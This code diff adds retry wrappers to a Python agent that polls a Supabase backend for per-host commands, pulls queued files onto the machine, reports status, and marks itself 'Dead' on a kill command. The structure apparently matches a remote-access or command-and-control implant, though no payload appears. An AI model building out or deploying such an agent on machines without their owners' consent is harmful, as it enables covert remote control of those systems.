@@ -5,6 +5,7 @@ from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
+from .retry_utils import with_retries
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
@@ -19,30 +20,20 @@ def handle_kill_command(command_id, command_text, hostname, supabase: Client):
 
         # Update the command status to 'Completed' and note that the agent is being terminated
         try:
-            response = supabase.table('py2').update({
+            with_retries(lambda: supabase.table('py2').update({
                 'status': 'Completed',
                 'output': 'Agent terminated'
-            }).eq('id', command_id).execute()
-
-            if response.data:
-                logging.info("Command status updated successfully to 'Completed'.")
-            else:
-                logging.warning(f"Error updating command status: {response.json()}")  # Log error details
-
+            }).eq('id', command_id).execute())
+            logging.info("Command status updated successfully to 'Completed'.")
         except Exception as e:
             logging.error(f"Failed to update command status before termination: {e}")
 
         # Update the 'settings' table to mark the agent as 'Dead'
         try:
-            response = supabase.table('settings').update({
+            with_retries(lambda: supabase.table('settings').update({
                 'check_in': 'Dead'
-            }).eq('hostname', hostname).execute()
-
-            if response.data:
-                logging.info("Agent status updated successfully to 'Dead'.")
-            else:
-                logging.warning(f"Error updating agent status: {response.json()}")  # Log error details
-
+            }).eq('hostname', hostname).execute())
+            logging.info("Agent status updated successfully to 'Dead'.")
         except Exception as e:
             logging.error(f"Failed to update agent status before termination: {e}")
 
@@ -56,19 +47,19 @@ def execute_commands(supabase: Client):
     hostname, ip, os_info = get_system_info()
 
     # Handle pending uploads
-    pending_uploads_response = fetch_pending_uploads(supabase)
+    pending_uploads_response = with_retries(lambda: fetch_pending_uploads(supabase))
     if pending_uploads_response.data:
         for upload in pending_uploads_response.data:
             file_url = upload.get('file_url')
             remote_path = upload.get('remote_path')
             if file_url and remote_path:
                 if download_from_supabase(file_url, remote_path, SUPABASE_KEY, supabase):
-                    supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
+                    with_retries(lambda: supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute())
                 else:
-                    supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
+                    with_retries(lambda: supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute())
 
     # Fetch and handle commands for the hostname
-    pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)
+    pending_commands_response = with_retries(lambda: fetch_pending_commands_for_hostname(hostname, supabase))
     if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
